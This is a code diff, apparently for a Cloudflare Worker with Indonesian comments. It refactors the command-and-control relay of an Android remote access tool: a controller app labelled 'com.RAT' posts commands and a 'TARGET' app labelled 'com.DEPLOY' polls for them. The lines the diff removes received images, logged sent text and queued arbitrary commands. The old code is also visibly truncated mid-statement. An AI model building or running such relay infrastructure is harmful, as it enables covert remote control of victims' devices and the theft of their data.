@@ -1,11 +1,32 @@
-// Simpan command terakhir
+// ================================
+// GLOBAL STATE (mirip variable server Node)
+// ================================
 let lastCommand = "NONE";
 
-export default {
-  async fetch(request, env) {
+// ================================
+// HELPER RESPONSE (ala Node res.json)
+// ================================
+function jsonResponse(data, status = 200) {
+  return new Response(JSON.stringify(data), {
+    status,
+    headers: {
+      "Content-Type": "application/json",
+      "Access-Control-Allow-Origin": "*",
+      "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
+      "Access-Control-Allow-Headers": "Content-Type"
+    }
+  });
+}
 
-    // ===== CORS (aman untuk Android) =====
-    if (request.method === "OPTIONS") {
+// ================================
+// MAIN HANDLER (mirip app.listen)
+// ================================
+export default {
+  async fetch(req, env) {
+    const method = req.method;
+
+    // ===== CORS PREFLIGHT =====
+    if (method === "OPTIONS") {
       return new Response(null, {
         headers: {
           "Access-Control-Allow-Origin": "*",
@@ -15,11 +36,11 @@ export default {
       });
     }
 
-    // ===== CONTROLLER (POST dari com.RAT) =====
-    if (request.method === "POST") {
+    // ===== POST → CONTROLLER (com.RAT) =====
+    if (method === "POST") {
       try {
-        const body = await request.json();
-        const msg = (body.message || "").toLowerCase();
+        const body = await req.json();
+        const msg = String(body.message || "").toLowerCase();
 
         if (
           msg.includes("nyalakan senter") ||
@@ -36,64 +57,24 @@ export default {
           lastCommand = "NONE";
         }
 
-        return new Response(
-          JSON.stringify({
-            status: "OK",
-            command: lastCommand
-          }),
-          {
-            headers: {
-              "Content-Type": "application/json",
-              "Access-Control-Allow-Origin": "*"
-            }
-          }
-        );
-      } catch (e) {
-        return new Response(
-          JSON.stringify({ status: "ERROR" }),
-          { status: 400 }
-        );
+        return jsonResponse({
+          status: "OK",
+          command: lastCommand
+        });
+
+      } catch (err) {
+        return jsonResponse({ status: "ERROR" }, 400);
       }
     }
 
-    // ===== TARGET (GET dari com.DEPLOY) =====
-    if (request.method === "GET") {
-      return new Response(
-        JSON.stringify({
-          command: lastCommand
-        }),
-        {
-          headers: {
-            "Content-Type": "application/json",
-            "Access-Control-Allow-Origin": "*"
-          }
-        }
-      );
+    // ===== GET → TARGET (com.DEPLOY) =====
+    if (method === "GET") {
+      return jsonResponse({
+        command: lastCommand
+      });
     }
 
-    return new Response("Method Not Allowed", { status: 405 });
+    // ===== METHOD NOT ALLOWED =====
+    return jsonResponse({ error: "Method Not Allowed" }, 405);
   }
-};, err);
-      return new Response("Failed to save image", { status: 500 });
-    }
-  }
-
-  // ======== SEND TEXT ========
-  if (path === "/send") {
-    const body = await request.text();
-    console.log("[SEND TEXT] " + body);
-    return new Response("OK", { status: 200 });
-  }
-
-  // ======== ADD COMMAND (optional) ========
-  if (path === "/add_command" && request.method === "POST") {
-    const data = await request.json().catch(() => ({}));
-    const cmd = data.cmd;
-    if (!cmd) return new Response("Missing cmd", { status: 400 });
-    env.COMMANDS.push(cmd);
-    return new Response(`Command added: ${cmd}`, { status: 200 });
-  }
-
-  // ======== DEFAULT ========
-  return new Response("Cloudflare Worker Active", { status: 200 });
 };
